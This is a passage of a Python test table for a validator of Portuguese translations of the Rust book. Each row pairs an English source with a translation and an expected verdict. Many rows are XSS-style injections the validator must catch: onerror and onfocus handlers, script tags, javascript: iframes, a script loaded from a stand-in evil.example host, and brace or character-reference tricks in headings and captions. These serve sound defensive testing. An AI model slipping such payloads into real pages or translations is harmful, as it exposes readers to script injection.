    ("links", None, "Mail <fulano@exemplo.org>.", "Escreva para <fulano@exemplo.org>.", "autolink de e-mail mantido"),
    ("links", "erro", "Mail <fulano@exemplo.org>.", "Escreva para <outro@exemplo.org>.", "autolink de e-mail alterado"),
    ("links", "erro", "Hello there.", "Olá. <fulano@evil.example>", "autolink de e-mail acrescentado (vira link mailto:)"),
    ("links", "erro", "Hello there.", "Olá. <`a`@evil.example>", "autolink de e-mail com crases na parte local"),
    ("links", None, "Write to fulano@exemplo.org.", "Escreva para fulano@exemplo.org.", "e-mail sem os sinais de menor e maior não é autolink"),
    ("links", "erro", "Hello there.", "Olá. [a][a](https://evil.example/)",
     "[texto][rótulo](destino): sem o rótulo definido, o link em linha vale"),
    ("links", "erro", "Hello there.", "Olá. [a][](https://evil.example/)", "[texto][](destino): o link em linha vale"),
    ("links", None, "See [a][b] and (c).", "Veja [a][b] e (c).", "[texto][rótulo] e parênteses depois de um espaço"),
    # referencias
    ("referencias", None, "See [translations] now.", "Veja [traduções][translations] agora.", "atalho virou [texto][rótulo]"),
    ("referencias", None, "See [Translations] now.", "Veja [t][ translations ] agora.", "rótulo sem diferenciar maiúsculas e espaços"),
    ("referencias", None, "See [text][label].", "Veja [texto][LABEL].", "rótulo completo mantido"),
    ("referencias", None, "See [label][].", "Veja [rótulo][label].", "rótulo colapsado mantido"),
    ("referencias", None, "See [`String`] now.", "Veja [`String`] agora.", "rótulo com código mantido"),
    ("referencias", None, "A [definition]: here.", "Uma [definição]: aqui.", "'[x]:' é definição, não referência"),
    ("referencias", None, "Call `[package]` now.", "Chame `[package]` agora.", "colchetes dentro de código não contam"),
    ("referencias", None, "Marker\\[1\\] here.", "Marcador\\[1\\] aqui.", "colchetes escapados não são rótulo"),
    ("referencias", "erro", "See [translations] now.", "Veja [traduções] agora.", "atalho traduzido sem definição"),
    ("referencias", "erro", "See [text][label].", "Veja [texto][outro].", "rótulo completo trocado"),
    ("referencias", "erro", "See [label][].", "Veja [rótulo][] agora.", "rótulo colapsado traduzido"),
    ("referencias", "erro", "See [`a`] and more.", "Veja [`b`] e mais.", "rótulos com código diferentes"),
    ("referencias", "erro", "See [<code>a</code>] now.", "Veja [<code>b</code>] agora.", "rótulo com tag diferente"),
    ("referencias", "erro", "Hash tables[^siphash]<!-- ignore -->.", "Tabelas hash.", "nota de rodapé removida"),
    ("referencias", "aviso", "See the book.", "Veja [o livro][book].", "rótulo novo sem definição"),
    ("referencias", "erro", "See the book.", "Veja [o livro][book].\n[book]: https://evil.example/",
     "rótulo novo definido no próprio msgstr"),
    ("referencias", "erro", "See the book.", "[book]: https://evil.example/\nVeja o livro [book].",
     "rótulo novo definido no começo do msgstr"),
    # listing
    ("listing", None, _LISTING, _LISTING_PT, "Listing traduzido só na legenda"),
    ("listing", None, '<Listing number="1-1" caption="A">\n', '<Listing number="1-1" caption="Um A">\n', "Listing sem file-name"),
    ("listing", "erro", _LISTING, _LISTING_PT.replace('2-1', '2-2'), "número alterado"),
    ("listing", "erro", _LISTING, _LISTING_PT.replace('src/main.rs', 'src/principal.rs'), "file-name traduzido"),
    ("listing", "erro", _LISTING, '<Listing number="2-1" caption="Lê um `guess`">\n', "file-name removido"),
    ("listing", "erro", _LISTING, '<Listing number="2-1" file-name="src/main.rs">\n', "legenda removida"),
    ("listing", "erro", _LISTING, '<Listing number="2-1" file-name="src/main.rs" caption="">\n', "legenda vazia"),
    ("listing", "erro", 'Veja <Listing number="2-1" file-name="a.rs">\n', 'Veja ' + _LISTING_PT.replace('src/main.rs', 'a.rs'), "legenda inventada"),
    ("listing", "erro", _LISTING, "Legenda solta\n", "tag Listing sumiu"),
    ("listing", "erro", _LISTING, _LISTING_PT + _LISTING_PT, "Listing duplicado"),
    ("listing", "erro", _LISTING, "Veja: " + _LISTING_PT, "texto antes da tag (deixa de ser bloco HTML)"),
    ("listing", "erro", _LISTING, _LISTING_PT.replace('file-name=', '\nfile-name='),
     "quebra de linha entre os atributos da tag"),
    ("listing", "erro", _LISTING, _LISTING_PT.replace('Lê um', 'Lê\num'), "quebra de linha dentro da legenda"),
    ("listing", "erro", _LISTING, _LISTING_PT.replace('>\n', '>Listagem\n'), "texto depois da tag na mesma linha"),
    ("listing", None, _LISTING, _LISTING_PT.replace('>\n', '>  \n'), "espaços depois da tag são aceitos"),
    # legenda (caption=) do <Listing>: o mdbook-trpl-listing a lê como Markdown e o HTML cru dela vai ao livro
    ("links", None, _listing_com("See [the book](https://doc.rust-lang.org/book/)"),
     _listing_com("Veja [o livro](https://doc.rust-lang.org/book/)"), "legenda: link mantido"),
    ("links", None, _listing_com("Using `Vec<T>` and `Rc<RefCell<i32>>`"),
     _listing_com("Usando `Vec<T>` e `Rc<RefCell<i32>>`"), "legenda: genéricos entre crases não são link nem tag"),
    ("links", "erro", _LISTING, _listing_com("Lê um `guess` [aqui](https://evil.example/cap)"),
     "legenda: link inline acrescentado"),
    ("links", "erro", _LISTING, _listing_com("Lê um `guess` ![](https://evil.example/x.png)"),
     "legenda: imagem acrescentada"),
    ("links", "erro", _LISTING, _listing_com("Lê um `guess` <https://evil.example/a>"), "legenda: autolink acrescentado"),
    ("links", "erro", _listing_com("See [the book](https://doc.rust-lang.org/book/)"), _listing_com("Veja o livro"),
     "legenda: link do msgid perdido"),
    ("links", "erro", _listing_com("See [the book](https://doc.rust-lang.org/book/)"),
     _listing_com("Veja [o livro](https://evil.example/)"), "legenda: destino do link alterado"),
    ("referencias", None, _listing_com("See [`String`]"), _listing_com("Veja [`String`]"), "legenda: rótulo mantido"),
    ("referencias", "erro", _LISTING, _listing_com("Lê um `guess` [aqui][x]"),
     "legenda: link de referência novo (um aviso no texto, erro na legenda)"),
    ("referencias", "erro", _LISTING, _listing_com("Lê um [guess]"), "legenda: rótulo novo sem definição"),
    ("definicoes", "erro", _LISTING, _listing_com("[x]: https://evil.example/ Lê um `guess`"),
     "legenda: definição de rótulo"),
    ("tags_html", None, _listing_com("Using <em>this</em>"), _listing_com("Usando <em>isto</em>"), "legenda: tag mantida"),
    ("tags_html", "erro", _LISTING, _listing_com("<a href='https://evil.example/h'>Lê</a> um `guess`"),
     "legenda: <a> acrescentado"),
    ("tags_html", "erro", _LISTING, _listing_com("Lê um `guess` <img src=x onerror=alert(1)>"),
     "legenda: <img onerror> acrescentado"),
    ("tags_html", "erro", _LISTING, _listing_com("Lê um `guess` <script>alert(1)</script>"),
     "legenda: <script> acrescentado"),
    ("atributos_html", None, _listing_com("See <a href='x.html' title='Hello'>this</a>"),
     _listing_com("Veja <a href='x.html' title='Olá'>isto</a>"), "legenda: title é traduzível, href fica"),
    ("atributos_html", "erro", _listing_com("See <a href='x.html'>this</a>"),
     _listing_com("Veja <a href='https://evil.example/'>isto</a>"), "legenda: href alterado"),
    ("atributos_html", "erro", _listing_com("See <a href='x.html'>this</a>"),
     _listing_com("Veja <a href='x.html' onclick='alert(1)'>isto</a>"), "legenda: onclick acrescentado"),
    ("html_bloco", None, _listing_com("Is a < b"), _listing_com("É a < b"), "legenda: '<' solto não abre bloco"),
    ("html_bloco", "erro", _LISTING, _listing_com("Lê um `guess` <pre aqui"), "legenda: <pre sem '>'"),
    ("html_bloco", "erro", _LISTING, _listing_com("Lê um `guess` <script src=//evil.example"),
     "legenda: <script sem '>'"),
    ("url_nua", None, _listing_com("Visit https://rust-lang.org"), _listing_com("Visite https://rust-lang.org"),
     "legenda: URL que o msgid também tem"),
    ("url_nua", "aviso", _LISTING, _listing_com("Lê um `guess` https://evil.example/"), "legenda: URL nua acrescentada"),
    # o pulldown-cmark do mdbook-trpl liga os atributos de título (`# x {onfocus=...}` vira <h1 onfocus=...>),
    # lê o bloco HTML de tipo 6 cru (`<div =x ...>`) e faz de `<fulano@exemplo.org>` um link mailto:
    ("estrutura", None, _listing_com("Using `# x` and `- y`"), _listing_com("Usando `# x` e `- y`"),
     "legenda: marcadores de bloco em código inline não contam"),
    ("estrutura", None, _listing_com("Is a > b"), _listing_com("É a > b"), "legenda: '>' no meio da linha não é citação"),
    ("estrutura", "erro", _LISTING, _listing_com("# Lê um `guess` {tabindex=0 autofocus onfocus=alert(1)}"),
     "legenda: título com atributos"),
    ("estrutura", "erro", _LISTING, _listing_com("> Lê um `guess`"), "legenda: citação"),
    ("estrutura", "erro", _LISTING, _listing_com("- Lê um `guess`"), "legenda: item de lista"),
    ("html_bloco", None, _listing_com("Using <div class='x'>this</div>"), _listing_com("Usando <div class='x'>isto</div>"),
     "legenda: tag de bloco completa é tag"),
    ("html_bloco", "erro", _LISTING, _listing_com("<div =x onmouseover=alert(2)> Lê um `guess`"),
     "legenda: tag de bloco malformada (tipo 6)"),
    ("links", "erro", _LISTING, _listing_com("Lê um `guess` <fulano@evil.example>"), "legenda: autolink de e-mail acrescentado"),
    ("links", "erro", _LISTING, _listing_com("Lê um `guess` [a][a](https://evil.example/)"),
     "legenda: [texto][rótulo](destino) acrescentado"),
    # tags_html
    ("tags_html", None, "<span class=\"filename\">Filename: src/lib.rs</span>", "<span class=\"filename\">Nome do arquivo: src/lib.rs</span>", "span mantido"),
    ("tags_html", None, "Press <kbd>Ctrl</kbd> and <kbd>C</kbd>.", "Pressione <kbd>Ctrl</kbd> e <kbd>C</kbd>.", "kbd mantido"),
    ("tags_html", None, "<img src=\"a.svg\" alt=\"Ferris\"/>", "<img src=\"a.svg\" alt=\"Ferris, o caranguejo\">", "img com /> ou >"),
    ("tags_html", None, "Use `Vec<T>` here.", "Use `Vec<T>` aqui.", "genéricos em código não são tags"),
    ("tags_html", "erro", "<span class=\"filename\">Filename: a</span>", "Nome do arquivo: a", "span removido"),
    ("tags_html", "erro", "Press <kbd>Ctrl</kbd>.", "Pressione <kbd>Ctrl.", "tag de fechamento removida"),
    ("tags_html", "erro", "Press <kbd>Ctrl</kbd>.", "Pressione <kbd>Ctrl</kbd> <br>.", "tag inventada"),
    ("tags_html", "erro", "A <em>b</em>.", "Um <i>b</i>.", "tag trocada"),
    ("tags_html", "erro", _LISTING, _LISTING_PT.rstrip("\n") + "</Listing>\n", "</Listing> acrescentado na mesma linha"),
    ("tags_html", "erro", _LISTING, _LISTING_PT + "</Listing>\n", "</Listing> acrescentado depois da abertura"),
    ("tags_html", "erro", "Veja\n</Listing>\n", "Veja\n", "</Listing> do msgid perdido"),
    ("tags_html", None, "Veja\n</Listing>\n", "Veja\n</Listing>\n", "</Listing> mantido"),
    # atributos_html
    ("atributos_html", None, "<a id=\"x\"></a>Text", "<a id=\"x\"></a>Texto", "id mantido"),
    ("atributos_html", None, "<img src=\"a.svg\" class=\"f\" alt=\"A\"/>", "<img src=\"a.svg\" class=\"f\" alt=\"Um\"/>", "alt é traduzível"),
    ("atributos_html", None, "<a title=\"Hello there\" href=\"x\">a</a>", "<a title=\"Olá\" href=\"x\">a</a>", "title é traduzível"),
    ("atributos_html", "erro", "<a id=\"installation\"></a>Text", "<a id=\"instalacao\"></a>Texto", "id traduzido"),
    ("atributos_html", "erro", "<a href=\"x.html\">a</a>", "<a href=\"y.html\">a</a>", "href alterado"),
    ("atributos_html", "erro", "<img src=\"a.svg\" class=\"f\" alt=\"A\"/>", "<img src=\"a.svg\" alt=\"A\"/>", "class removida"),
    ("atributos_html", "erro", "<span class=\"filename\">x</span>", "<span class=\"nome\">x</span>", "class traduzida"),
    ("atributos_html", "erro", "Press <input disabled name=\"a\"> now.", "Pressione <input name=\"a\"> agora.",
     "atributo sem valor removido"),
    # ignore
    ("ignore", None, "See [a](b.html)<!-- ignore -->.", "Veja [a](b.html)<!-- ignore -->.", "ignore mantido"),
    ("ignore", None, "See [a](b.html)<!-- ignore\n-->.", "Veja [a](b.html)<!--ignore-->.", "ignore com quebra/espaços equivale"),
    ("ignore", "erro", "See [a](b.html)<!-- ignore -->.", "Veja [a](b.html).", "ignore removido"),
    ("ignore", "erro", "See [a](b.html).", "Veja [a](b.html)<!-- ignore -->.", "ignore inventado"),
    # html_bloco
    ("html_bloco", None, "See [a](b.html)<!-- ignore -->.", "Veja [a](b.html)<!-- ignore -->.", "comentário completo mantido"),
    ("html_bloco", None, "Is a < b true?", "É a < b verdade?", "'<' solto não abre bloco"),
    ("html_bloco", None, "Write `<!--` here.", "Escreva `<!--` aqui.", "'<!--' em código não conta"),
    ("html_bloco", None, "Use <pre class=\"x\">a</pre> here.", "Use <pre class=\"x\">a</pre> aqui.", "<pre> completo é tag, não bloco"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n<!-- aqui.", "comentário aberto e não fechado"),
    ("html_bloco", "erro", "Second paragraph here.", "<!-- Segundo parágrafo aqui.", "comentário aberto no começo"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n<pre aqui", "<pre sem '>'"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n<!DOCTYPE aqui", "<!DOCTYPE sem '>'"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n<? aqui", "'<?' sem '?>'"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo <!-- parágrafo --> aqui.", "comentário HTML acrescentado"),
    ("html_bloco", None, "Use <div class=\"x\">a</div> here.", "Use <div class=\"x\">a</div> aqui.", "<div> completo é tag, não bloco"),
    ("html_bloco", None, "Second paragraph here.", "Segundo <divisão aqui.", "'<div' dentro de outro nome não abre bloco"),
    ("html_bloco", "erro", "Second paragraph here.", "<div =x onmouseover=alert(2)> Segundo parágrafo aqui.",
     "tag de bloco malformada no começo (tipo 6: o atributo chega ao livro)"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n<table =x>", "<table malformada depois de quebra de linha"),
    ("html_bloco", "erro", "Second paragraph here.", "Segundo parágrafo\n</DIV =x>", "</DIV malformado, em maiúsculas"),
    ("html_bloco", "erro", "Second paragraph here.", "> <iframe =x src=javascript:alert(1)>", "tag de bloco malformada dentro de uma citação"),
    # versoes
    ("versoes", None, "Rust 1.98.0 (released 2026-08-20) or later.", "Rust 1.98.0 (lançado em 2026-08-20) ou posterior.", "versão e data mantidas"),
    ("versoes", None, "Use `rand` 0.10 here.", "Use `rand` 0.10 aqui.", "duas partes fora de 'Rust X.Y'"),
    ("versoes", None, "It ends in Rust 1.5.", "Termina no Rust 1.5.", "ponto final depois da versão"),
    ("versoes", None, "See [v](https://x.org/1.2.3/a.html) now.", "Veja [v](https://x.org/1.2.3/a.html) agora.", "versão dentro do destino do link"),
    ("versoes", None, "Version 0.999._x_ series.", "Série 0.999._x_.", "versão seguida de ênfase"),
    ("versoes", None, "Use the number 42 today.", "Use o número 42 hoje.", "número sem ponto não é versão"),
    ("versoes", "erro", "Rust 1.98.0 or later.", "Rust 1.90.0 ou posterior.", "versão de três partes trocada"),
    ("versoes", "erro", "Released 2026-08-20.", "Lançado em 2025-09-18.", "data trocada"),
    ("versoes", "erro", "Use `rand` 0.10 here.", "Use `rand` 0.8 aqui.", "rand 0.10 virou 0.8"),
    ("versoes", "erro", "Use `rand` 0.10 here.", "Use `rand` aqui.", "versão de duas partes omitida"),
    ("versoes", "erro", "In early versions (pre-1.0) it differed.", "Nas versões iniciais (pré-0.9) era diferente.", "pre-1.0"),
    ("versoes", "erro", "It uses HTTP version 1.1 here.", "Usa a versão 2.0 do HTTP aqui.", "HTTP version 1.1"),
    ("versoes", "erro", "Version 0.10 is out.", "A versão 0.10.2 saiu.", "0.10 não vale dentro de 0.10.2"),
    ("versoes", "erro", "Version 0.10 is out.", "A versão 10.10 saiu.", "0.10 não vale dentro de 10.10"),
    ("versoes", "erro", "Version 0.10.2 is out.", "A versão 0.10 saiu.", "três partes reduzida a duas"),
    ("versoes", "erro", "Version 1.0.0-beta.1 is out.", "A versão 1.0.0 saiu.", "pré-lançamento omitido"),
    ("versoes", "aviso", "Version 0.10 is out.", "A versão 0.10 (antes 0.8) saiu.", "versão antiga sobrando no msgstr"),
    ("versoes", None, "That is 10,800 seconds.", "São 10.800 segundos.", "separador de milhar do português não é versão"),
    ("versoes", "aviso", "That is 10 seconds.", "São 10.800 segundos.", "10.800 sem '10,800' no msgid continua aviso"),
    # versões e datas dentro de atributos traduzíveis (caption= do <Listing>, alt=, title=)
    ("versoes", "erro",
     '<Listing number="2-3" file-name="Cargo.toml" caption="Requiring rand 0.10.1 and Rust 1.98.0 (2026-08-20)">\n',
     '<Listing number="2-3" file-name="Cargo.toml" caption="Exigindo rand 0.8.5 e Rust 1.90.0 (2025-09-18)">\n',
     "versões e data trocadas na legenda de um Listing"),
    ("versoes", "erro", '<img alt="Server at 127.0.0.1:8080" src="a.png">',
     '<img alt="Servidor em localhost" src="a.png">', "versão/endereço perdido no alt de uma imagem"),
    ("versoes", "erro", '<a title="Since Rust 1.98.0" href="x.html">link</a>',
     '<a title="Desde o Rust 1.97.0" href="x.html">link</a>', "versão trocada em title="),
    ("versoes", None,
     '<Listing number="2-3" file-name="Cargo.toml" caption="Requiring rand 0.10.1 and Rust 1.98.0 (2026-08-20)">\n',
     '<Listing number="2-3" file-name="Cargo.toml" caption="Exigindo rand 0.10.1 e Rust 1.98.0 (2026-08-20)">\n',
     "versões e data mantidas na legenda de um Listing"),
    ("versoes", None, '<img alt="Server at 127.0.0.1:8080" src="a.png">',
     '<img alt="Servidor em 127.0.0.1:8080" src="a.png">', "versão/endereço mantido no alt de uma imagem"),
    ("versoes", None, '<Listing number="1-1" file-name="src/1.2.3/main.rs" caption="Prints hello">\n',
     '<Listing number="1-1" file-name="src/1.2.3/main.rs" caption="Imprime olá">\n',
     "versão no file-name= (atributo fixo) não é exigida na legenda"),
    ("versoes", "aviso", '<img alt="Server" src="a.png">', '<img alt="Servidor 0.8.5" src="a.png">',
     "versão que só existe no alt do msgstr"),
    # slug
    ("slug", None, "Installation", "Instalação {#installation}", "slug no fim"),
    ("slug", None, "Installation", "Instalação", "sem slug"),
    ("slug", None, "Using `{#id}` syntax", "Usando a sintaxe `{#id}`", "{# dentro de código não conta"),
    ("slug", None, "Include {{#include a.rs}} here", "Inclua {{#include a.rs}} aqui", "diretiva {{# não é slug"),
    ("slug", "erro", "Installation", "Instalação {#instalação}", "slug com caractere fora do padrão"),
    ("slug", "erro", "Installation", "Instalação {#installation .x}", "slug com classe/espaço"),
    ("slug", "erro", "Installation", "Instalação {#installation} do Rust", "slug no meio"),
    ("slug", "erro", "Installation", "Instalação {#installation", "slug sem fechar"),
    ("slug", "erro", "Installation", "Instalação {#a} {#b}", "dois slugs"),
    ("slug", "aviso", "This is a sentence that is plainly not a heading.", "Esta é uma frase que claramente não é um título. {#frase}", "slug em frase"),
    # bloco `{...}` no fim da linha: num título o mdbook o lê como atributos do <hN> (XSS por onfocus + autofocus)
    ("slug", "erro", "Processing a Guess", "Processando um palpite {tabindex=0 autofocus onfocus=alert(3)}",
     "atributos de título com autofocus (roda ao carregar a página)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}", "atributo de título acrescentado"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite { #x onfocus=y }", "bloco com espaço antes do # (não é slug)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {.c}", "classe de título acrescentada"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}  \t", "bloco seguido de espaço e tab"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}\x0c", "bloco seguido de \\f (o mdbook não o ignora, mas é espaço: por cautela)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite \\{onfocus=x}", "`\\` antes da chave não desliga o bloco"),
    ("slug", "erro", "Processing a Guess", 'Processando um palpite {onfocus="a}b"}', "`}` dentro do bloco, por cautela"),
    ("slug", "erro", "Processing a Guess", 'Processando um palpite {onfocus="a{b"}', "`{` dentro do bloco: vale o último"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {`x`}", "bloco com código dentro"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x} {#processing-a-guess}",
     "bloco antes do slug (o slugs.py pode tirar o slug e deixar o bloco no fim)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {#processing-a-guess}{onfocus=x}", "bloco depois do slug"),
    ("slug", "erro", "Processing a Guess", "Processando\n\nUm palpite {onfocus=x}\nmais texto", "bloco no fim de uma linha do meio"),
    ("slug", "erro", "Processing a Guess", "- Processando {onfocus=x}", "bloco no fim de um item de lista"),
    # as referências de caractere voltam como o caractere na ida e volta do gettext: o mdbook lê o bloco que elas formam
    ("slug", "erro", "Processing a Guess", "Processando um palpite {tabindex=0 autofocus onfocus=alert(3)&#125;",
     "`}` como referência decimal"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &#123;onfocus=x}", "`{` como referência decimal"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &#x7B;onfocus=x&#x7D;", "chaves como referência hexadecimal"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &#X7b;onfocus=x&#X7d;", "referência com X maiúsculo"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &#0000123;onfocus=x&#0000125;", "referência com sete dígitos"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &lcub;onfocus=x&rcub;", "chaves como referência nomeada (lcub, rcub)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &lbrace;onfocus=x&rbrace;", "chaves como referência nomeada (lbrace, rbrace)"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&#32;", "espaço depois do bloco como referência"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&#9;", "tab depois do bloco como referência"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&#10;", "quebra de linha depois do bloco como referência"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&#13;", "CR depois do bloco como referência"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&Tab;", "tab depois do bloco como referência nomeada"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {onfocus=x}&NewLine;", "quebra depois do bloco como referência nomeada"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite &#123;#x onfocus=y&#125;", "slug malformado escrito com referências"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {#x onfocus=y&#125;", "slug com atributo fechado por referência"),
    # o `{` de dentro de um código inline abre o bloco (o pulldown-cmark o procura no texto cru)
    ("slug", "erro", "Using x", "Usando `x{` onfocus=alert(1)}", "`{` dentro de código, `}` fora dele"),
    ("slug", "erro", "Using x", "Usando ``x{`` onfocus=alert(1)}", "`{` dentro de código com duas crases"),
    ("slug", "erro", "Using x", "Usando `x{`onfocus=alert(1)}", "código colado ao atributo"),
    ("slug", "erro", "Processing a Guess", "Processando um palpite {{#x onfocus=y}", "`{#` colado a outro `{` não é slug"),
    ("slug", "erro", "Set the width with {width}", "Defina a largura com {width} e {altura}", "o msgid tem {width}, mas {altura} é nova"),
    ("slug", "erro", "Set the width with {width}", "Defina {altura}\nDefina a largura com {width}", "o msgid tem um bloco só: o outro é novo"),
    ("slug", None, "Processing a Guess", "Processando um palpite {#processing-a-guess}", "só o slug no fim de um título"),
    ("slug", None, "Processing a Guess", "Processando um palpite {#processing-a-guess}  ", "slug seguido de espaço"),
    ("slug", None, "Using the `{}` placeholder", "Usando o marcador `{}`", "`{}` em código no fim não é bloco"),
    ("slug", None, "Using the `{onfocus=x}` syntax", "Usando a sintaxe `{onfocus=x}`", "atributos em código no fim não são bloco"),
    ("slug", None, "Grouping {x} together", "Agrupando {x} junto", "chaves no meio da frase"),
    ("slug", None, "Set the width with {width}", "Defina a largura com {width}", "o msgid também termina no bloco"),
    ("slug", None, "Set the width with {width}", "Defina a largura com {width} {#set-the-width}", "bloco do msgid antes do slug"),
    ("slug", None, "Include {{#include a.rs}}", "Inclua {{#include a.rs}}", "diretiva {{# no fim da linha não é bloco"),
    ("slug", None, "Processing a Guess", "Processando {onfocus=x} um palpite", "bloco no meio da linha"),
    ("slug", None, "Using `&#123;x&#125;`", "Usando `&#123;x&#125;`", "referência dentro de código é texto, não chave"),
    ("slug", None, "Using `&#123;x`", "Usando `&#123;x` &#125;", "só a chave de fora é chave: sem `{` não há bloco"),
    ("slug", None, "Grouping x together", "Agrupando &#123;x&#125; junto", "chaves como referência no meio da frase"),
    ("slug", None, "Tom &amp; Jerry", "Tom &amp; Jerry", "referência fora do conjunto fica como está"),
    ("slug", None, "Using `x{` here", "Usando `x{` aqui", "`{` em código sem `}` no fim"),
    # caracteres
    ("caracteres", None, "Hello there, friend.", "Olá \U0001f600, amigo.\tcom tab\ne quebra.", "emoji, tab e quebra de linha são válidos"),
    ("caracteres", None, "Hello there, friend.", "Olá, amigo. ‘aspas’ “curvas” — ç ã é.", "Unicode comum"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \ud800 amigo.", "surrogate isolado (emoji cortado)"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \udc00 amigo.", "surrogate baixo isolado"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \x00 amigo.", "NUL"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \x07 amigo.", "BEL"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \x1b[0m amigo.", "ESC"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \x7f amigo.", "DEL"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \x85 amigo.", "NEL (controle C1)"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \u2028 amigo.", "separador de linha Unicode"),
    ("caracteres", "erro", "Hello there, friend.", "Olá\r\namigo.", "retorno de carro"),
    ("caracteres", "erro", "Hello there, friend.", "Ol\ufffd amigo.", "caractere de substituição"),
    ("caracteres", "erro", "Use the safe API here.", "Use a API \u202eorugesni\u202c aqui.", "controle bidi (U+202E) inverte o texto"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \u200e amigo.", "marca de direção U+200E"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \u2066amigo\u2069.", "isolamento bidi U+2066"),
    ("caracteres", "erro", "Hello there, friend.", "Olá\u200b amigo.", "espaço de largura zero no meio do texto"),
    ("caracteres", "erro", "Hello there, friend.", "Olá \ufeffamigo.", "BOM no meio do texto"),
    ("caracteres", None, "Hello\u200b there, friend.", "Olá\u200b amigo.", "invisível que o msgid também tem é cópia fiel"),
    ("caracteres", None, "Hello there, friend.", "Olá \U0001f469\u200d\U0001f4bb, amigo.", "ZWJ de emoji não é apontado"),
    # identico
    ("identico", "aviso", "This sentence was left in English by mistake.", "This sentence was left in English by mistake.", "prosa idêntica"),
    ("identico", None, "This sentence was left in English by mistake.", "Esta frase foi traduzida.", "prosa traduzida"),
    ("identico", "aviso", "Installing Rust on Linux or macOS", "Installing Rust on Linux or macOS {#installing-rust}",
     "título deixado em inglês (o slug final não conta)"),
    ("identico", None, "Installing Rust on Linux or macOS", "Instalando o Rust no Linux ou macOS {#installing-rust}",
     "título traduzido com slug"),
    ("identico", None, "Run `cargo new hello`.", "Run `cargo new hello`.", "poucas palavras fora do código"),
    ("identico", None, "```\nfn main() {}\n```", "```\nfn main() {}\n```", "código idêntico não é prosa"),
    # enfase
    ("enfase", None, "This is _very_ and **really** good.", "Isto é _muito_ e **realmente** bom.", "ênfase mantida"),
    ("enfase", None, "The *Cargo.toml* file.", "O arquivo _Cargo.toml_.", "* e _ equivalem"),
    ("enfase", None, "Use a snake_case_name here.", "Use um snake_case_name aqui.", "sublinhado dentro da palavra não é ênfase"),
    ("enfase", None, "See [a](ch_01_x.html) and 2 * 3.", "Veja [a](ch_01_x.html) e 2 * 3.", "destino e multiplicação não contam"),
    ("enfase", "aviso", "This is _very_ good.", "Isto é muito bom.", "itálico removido"),
    ("enfase", "aviso", "This is good.", "Isto é **muito** bom.", "negrito inventado"),
    ("enfase", "aviso", "This is **very** good.", "Isto é _muito_ bom.", "negrito virou itálico"),
    # aninhamento
    ("aninhamento", None, "See [a [b [c]]] now.", "Veja [a [b [c]]] agora.", "aninhamento normal"),
    ("aninhamento", None, "See " + "[" * 20 + "x" + "]" * 20 + " now.", "Veja " + "[" * 20 + "x" + "]" * 20 + " agora.", "msgid já aninhado: o limite sobe"),
    ("aninhamento", "erro", "Plain text here.", "Texto " + "[" * 17 + "x" + "]" * 17, "17 níveis"),
    ("aninhamento", "erro", "Plain text here.", "[" * 1000 + "x" + "]" * 1000, "1000 níveis"),
    # diretivas
    ("diretivas", None, "Take {{#include a.rs}} now.", "Pegue {{#include a.rs}} agora.", "diretiva mantida"),
    ("diretivas", "erro", "Take {{#include a.rs}} now.", "Pegue {{#include b.rs}} agora.", "diretiva alterada"),
    ("diretivas", "erro", "Take {{#include a.rs}} now.", "Pegue agora.", "diretiva removida"),
    # bordas
    ("bordas", None, _LISTING, _LISTING_PT, "newline final mantido"),
    ("bordas", None, "Hello there.", "Olá.", "sem newline nos dois"),
    ("bordas", "erro", _LISTING, _LISTING_PT.rstrip("\n"), "newline final perdido"),
    ("bordas", "erro", "Hello there.", "Olá.\n", "newline final inventado"),
    ("bordas", "erro", "\nHello there.", "Olá.", "newline inicial perdido"),
    # estrutura
    ("estrutura", None, "Each value has an _owner_.", "Cada valor tem um _dono_.", "um parágrafo simples"),
    ("estrutura", None, "Item one\nItem two", "Item um\nItem dois", "quebra de linha simples é continuação"),
    ("estrutura", None, "Rust 2018 - a new edition", "Rust 2018 - uma nova edição", "traço no meio da linha"),
    ("estrutura", None, "Line\n    indented line", "Linha\n    linha recuada", "recuo no meio do parágrafo é continuação"),
    ("estrutura", None, "Line\n2. two", "Linha\n2. dois", "'2.' no meio do parágrafo não abre lista"),
    ("estrutura", None, "First.\n\nSecond.", "Primeiro.\n\nSegundo.", "mesma quantidade de parágrafos"),
